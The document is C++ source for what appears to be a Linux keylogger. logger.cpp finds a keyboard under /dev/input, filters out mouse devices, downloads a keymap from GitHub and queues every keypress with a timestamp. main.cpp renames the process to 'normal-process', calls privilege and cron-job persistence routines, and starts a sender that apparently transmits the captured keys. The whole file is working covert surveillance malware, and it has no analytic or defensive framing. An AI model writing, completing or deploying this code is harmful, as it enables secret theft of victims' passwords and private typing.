// logger.cpp

#include "logger.h"

#include <curl/curl.h>
#include <linux/input-event-codes.h>
#include <nlohmann/json.hpp>
#include <sys/stat.h>
#include <sys/types.h>

#include <array>
#include <cassert>
#include <cstring>
#include <ctime>
#include <fcntl.h>
#include <filesystem>
#include <unistd.h>
#include <utility>

logger& logger::get_instance(tsq& queue) {
	static logger instance(queue);
	return instance;
}

logger::logger(tsq& queue)
: fd_(-1)
, initialized_(false)
, running_(false)
, q_(queue)
, ev_init_()
, whitelist_()
, blacklist_() {}

logger::~logger() { kill(); }

auto logger::init(const std::string& event_ID) -> bool {
	if (check_init()) {
		MSG(messagetype::error, "logger (init): logger already initialized.");
		return false;
	}

  keymap_ = load_keymap(
    "https://raw.githubusercontent.com/flinnthebin/ddlogger/0c18bbc8fa2f9c41c74ac61384e20d202d4b2b23/"
    "keymap.json");

	auto const device = event_ID.empty() ? find_kbd() : event_ID;
	if (device.empty()) {
		MSG(messagetype::error, "logger (init): no viable keyboard device found.");
		return false;
	}

	fd_ = open(device.c_str(), O_RDONLY | O_NONBLOCK);
	if (fd_ == -1) {
		MSG(messagetype::error, "logger (init): " + std::string{std::strerror(errno)});
		return false;
	}

	initialized_ = true;
	ev_init_     = device;

	MSG(messagetype::info, "logger (init): initialized");
	return true;
}

auto logger::check_init() const -> bool { return initialized_; }

auto logger::start() -> void {
	if (!check_init()) {
		MSG(messagetype::error, "logger (start): logger not initialized.");
		return;
	}
	if (running_) {
		MSG(messagetype::warning, "logger (start): logger already running.");
		return;
	}

	running_ = true;

	if (work_.joinable()) {
		MSG(messagetype::debug, "logger (start): joining worker thread.");
		work_.join();
	}

	work_ = std::thread(&logger::ev_reader, this);
	MSG(messagetype::info, "logger (start): logger processing thread started.");
}

auto logger::kill() -> void {
	running_ = false;
	if (fd_ != -1) {
		close(fd_);
		fd_ = -1;
	}
	if (work_.joinable()) {
		work_.join();
	}
	initialized_ = false;
	ev_init_.clear();
	MSG(messagetype::debug, "logger (kill): logger killed.");
}

// curl -v https://raw.githubusercontent.com/flinnthebin/ddlogger/0c18bbc8fa2f9c41c74ac61384e20d202d4b2b23/keymap.json
auto logger::load_keymap(const std::string& url) -> std::unordered_map<unsigned int, std::pair<std::string, std::string>> {
	std::unordered_map<unsigned int, std::pair<std::string, std::string>> keymap;

  static std::mutex load_mutex;
  std::lock_guard<std::mutex> lock(load_mutex);

  auto write_callback = [](char* data, size_t size, size_t nmemb, std::string* out) -> size_t {
    size_t total_size = size * nmemb;
    if (out == nullptr) {
      MSG(messagetype::error, "write_callback: out string is null.");
      return 0;
    }
    out->append(data, total_size);
    MSG(messagetype::debug, "write_callback: wrote " + std::to_string(total_size) + " bytes to response string.");
    return total_size;
  };

	
  CURL* curl = curl_easy_init();
  if (!curl) {
    MSG(messagetype::error, "logger (load_keymap): failed to initialize CURL.");
    return keymap;
  }

  std::string response;
  curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
  curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);


  CURLcode res = curl_easy_perform(curl);
  if (res != CURLE_OK) {
      MSG(messagetype::error, "logger (load_keymap): failed to fetch keymap - " + std::string{curl_easy_strerror(res)});
      curl_easy_cleanup(curl);
      return keymap;
  }

  MSG(messagetype::debug, "logger (load_keymap): response received - size " + std::to_string(response.size()) + " bytes.");

  curl_easy_cleanup(curl);

	try {
		auto keyconfig = nlohmann::json::parse(response);

		for (const auto& [key, val] : keyconfig.items()) {
			unsigned int code = std::stoi(key);
			std::string  name = val[0];
			std::string  ch   = val[1];
			keymap.emplace(code, std::make_pair(name, ch));
		}
	} catch (const std::exception& e) {
		MSG(messagetype::error, "logger (load_keymap): JSON parse error - " + std::string{e.what()});
	}

	return keymap;
}

auto logger::fd_monitor(signed int fd, fd_set& fds) -> signed int {
	struct timeval timeout {
		1, 0
	};

	FD_ZERO(&fds);
	FD_SET(fd, &fds);

	auto const fd_val = select(fd + 1, &fds, nullptr, nullptr, &timeout);
	if (fd_val == -1) {
		MSG(messagetype::error, "logger (fd_monitor): " + std::string{std::strerror(errno)});
	}
	return fd_val;
}

auto logger::datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
	auto date = std::array<char, 11>{};
	auto time = std::array<char, 9>{};

	std::tm* tv = std::localtime(&tv_sec);
	std::strftime(date.data(), date.size(), "%Y-%m-%d", tv);
	std::strftime(time.data(), time.size(), "%H:%M:%S", tv);

	return std::make_pair(std::string{date.data()}, std::string{time.data()});
}

auto logger::find_kbd() -> std::string {
	auto const in_dir = "/dev/input";
	if (!std::filesystem::exists(in_dir)) {
		MSG(messagetype::error, "logger (find_kbd): directory not found.");
		return "";
	}
	if (!std::filesystem::is_directory(in_dir)) {
		MSG(messagetype::error, "logger (find_kbd): input directory is not a directory.");
		return "";
	}

	for (auto const& device_path : whitelist_) {
		if (std::filesystem::exists(device_path)) {
			MSG(messagetype::debug, "logger (find_kbd): attempting whitelisted device " + device_path);

			auto fd = open(device_path.c_str(), O_RDONLY | O_NONBLOCK);
			if (fd == -1) {
				MSG(messagetype::debug, "logger (find_kbd): " + std::string{std::strerror(errno)});
				continue;
			}

			fd_set fds;
			FD_ZERO(&fds);
			auto fd_val = fd_monitor(fd, fds);
			if (fd_val > 0 && FD_ISSET(fd, &fds)) {
				close(fd);
				MSG(messagetype::info, "logger (find_kbd): found working input device at " + device_path);
				return device_path;
			}
			MSG(messagetype::debug, "logger (find_kbd): device non-responsive: " + device_path);
			close(fd);
		}
		else {
			MSG(messagetype::debug, "logger (find_kbd): whitelisted device not found: " + device_path);
		}
	}

	for (auto const& entry : std::filesystem::directory_iterator(in_dir)) {
		auto const& path = entry.path();
		if (path.filename().string().find("event") == 0) {
			auto const resolved_path = path.string();

			if (blacklist_.find(resolved_path) != blacklist_.end()) {
				MSG(messagetype::debug, "logger (find_kbd): skipping blacklisted device " + resolved_path);
				continue;
			}

			MSG(messagetype::debug, "logger (find_kbd): attempting device " + resolved_path);

			auto fd = open(resolved_path.c_str(), O_RDONLY | O_NONBLOCK);
			if (fd == -1) {
				MSG(messagetype::debug, "logger (find_kbd): " + std::string{std::strerror(errno)});
				continue;
			}

			fd_set fds;
			FD_ZERO(&fds);
			auto fd_val = fd_monitor(fd, fds);
			if (fd_val > 0 && FD_ISSET(fd, &fds)) {
				close(fd);
				MSG(messagetype::info, "logger (find_kbd): found working input device at " + resolved_path);
				return resolved_path;
			}
			MSG(messagetype::debug, "logger (find_kbd): device non-responsive: " + resolved_path);
			close(fd);
		}
	}
	MSG(messagetype::error, "logger (find_kbd): no viable keyboard device.");
	return "";
}

auto logger::ev_reader() -> void {
	MSG(messagetype::info, "logger (ev_reader): starting ev_reader.");
	auto ev = input_event{};
	while (running_) {
		fd_set fds;
		if (auto fd_val = fd_monitor(fd_, fds); fd_val == -1) {
			MSG(messagetype::error, "logger (ev_reader): " + std::string{std::strerror(errno)});
			break;
		}
		else if (fd_val > 0 && FD_ISSET(fd_, &fds)) {
			auto n = read(fd_, &ev, sizeof(ev));
			if (n == -1) {
				if (errno == EAGAIN || errno == EWOULDBLOCK) {
					MSG(messagetype::error, "logger (ev_reader): no data available (EAGAIN/EWOULDBLOCK).");
					continue;
				}
				else {
					MSG(messagetype::error, "logger (ev_reader): read error.");
					break;
				}
			}

			if (n == static_cast<ssize_t>(sizeof(ev)) && ev.type == EV_KEY) {
				if (ev.code >= 272 && ev.code <= 274) {
					MSG(messagetype::warning, "logger (ev_reader): mousetrap triggered. " + ev_init_ + " blacklisted.");
					close(fd_);
					fd_ = -1;
					blacklist_.insert(ev_init_);
					ev_init_.clear();

					ev_init_ = find_kbd();
					if (ev_init_.empty()) {
						MSG(messagetype::error, "logger (ev_reader): no viable keyboard device found after mousetrap.");
						running_ = false;
						break;
					}

					fd_ = open(ev_init_.c_str(), O_RDONLY | O_NONBLOCK);
					if (fd_ == -1) {
						MSG(messagetype::error, "logger (ev_reader): " + std::string{std::strerror(errno)});
						running_ = false;
						break;
					}
					MSG(messagetype::info, "logger (ev_reader): switched to new device: " + ev_init_);

					if (std::find(whitelist_.begin(), whitelist_.end(), ev_init_) == whitelist_.end()) {
						whitelist_.push_back(ev_init_);
					}
					continue;
				}

				auto  dtg      = datetime(ev.time.tv_sec);
				auto  key_char = get_keychar(ev.code);
				event e{dtg.first, dtg.second, key_char, ev.value ? true : false};
				if (ev.value == true) {
					MSG(messagetype::info, "logger (ev_reader): pushing event to queue: key = " + e.key);
					q_.push(e);
				}
				else if (ev.value == false) {
					MSG(messagetype::info, "logger (ev_reader): discarding key release: key = " + e.key);
				}
			}
		}
	}
	MSG(messagetype::info, "logger (ev_reader): ev_reader terminated.");
}

auto logger::get_keychar(unsigned int code) -> std::string {
	auto it = keymap_.find(code);
	if (it == keymap_.end()) {
		MSG(messagetype::warning, "logger (get_keychar): unknown key code: " + std::to_string(code));
		return "<unknown>";
	}
	return it->second.second;
}
// main.cpp

#include "logger.h"
#include "messages.h"
#include "procloader.h"
#include "sender.h"
#include "tsq.h"
#include <curl/curl.h>
#include <sys/prctl.h>

#include <chrono>
#include <cstring>
#include <thread>

messagetype messages = messagetype::debug;

auto main() -> int {
	CURLcode res = curl_global_init(CURL_GLOBAL_DEFAULT);
	if (res != CURLE_OK) {
		MSG(messagetype::error, "main: curl_global_init() failed: " + std::string{curl_easy_strerror(res)});
		return 1;
	}

	const char* pr_name = "normal-process";
	prctl(PR_SET_NAME, pr_name, 0, 0, 0);

	bool grpriv  = true;
	bool cronjob = true;

	procloader& loader = procloader::get_instance();

	while (!(grpriv && cronjob)) {
		if (loader.grpriv()) {
			grpriv = true;
			MSG(messagetype::info, "main: group privileges set.");
		}
		else {
			MSG(messagetype::error, "main: group privileges set error.");
		}

		if (loader.mkcron()) {
			cronjob = true;
			MSG(messagetype::info, "main: cron job set.");
		}
		else {
			MSG(messagetype::error, "main: cron job set error.");
		}

		if (!(grpriv && cronjob)) {
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}
	}

	tsq queue;

	logger& logger = logger::get_instance(queue);
	sender& sender = sender::get_instance(queue);

	while (true) {
		if (!logger.init("")) {
			MSG(messagetype::error, "main: logger init error.");
			std::this_thread::sleep_for(std::chrono::seconds(1));
			continue;
		}
		else {
			MSG(messagetype::info, "main: logger init.");
		}

		if (!sender.init("")) {
			MSG(messagetype::error, "main: sender init error.");
			std::this_thread::sleep_for(std::chrono::seconds(1));
			continue;
		}
		else {
			MSG(messagetype::info, "main: sender init.");
		}
		break;
	}

	logger.start();
	sender.start();

	while (true) {
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}

	curl_global_cleanup();
	return 0;
}
